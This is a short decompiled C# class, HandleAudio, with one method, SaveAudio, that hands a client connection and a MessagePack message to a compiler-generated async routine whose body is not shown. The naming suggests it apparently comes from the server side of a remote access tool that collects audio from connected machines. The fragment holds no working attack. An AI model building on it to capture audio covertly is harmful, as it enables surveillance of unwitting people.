using System;
using System.Runtime.CompilerServices;
using Server.Connection;
using Server.MessagePack;

namespace Server.Handle_Packet
{
	// Token: 0x02000038 RID: 56
	public class HandleAudio
	{
		// Token: 0x060002C3 RID: 707 RVA: 0x000149DC File Offset: 0x000149DC
		public void SaveAudio(Clients client, MsgPack unpack_msgpack)
		{
			HandleAudio.<SaveAudio>d__0 <SaveAudio>d__;
			<SaveAudio>d__.<>t__builder = AsyncVoidMethodBuilder.Create();
			<SaveAudio>d__.client = client;
			<SaveAudio>d__.unpack_msgpack = unpack_msgpack;
			<SaveAudio>d__.<>1__state = -1;
			<SaveAudio>d__.<>t__builder.Start<HandleAudio.<SaveAudio>d__0>(ref <SaveAudio>d__);
		}
	}
}
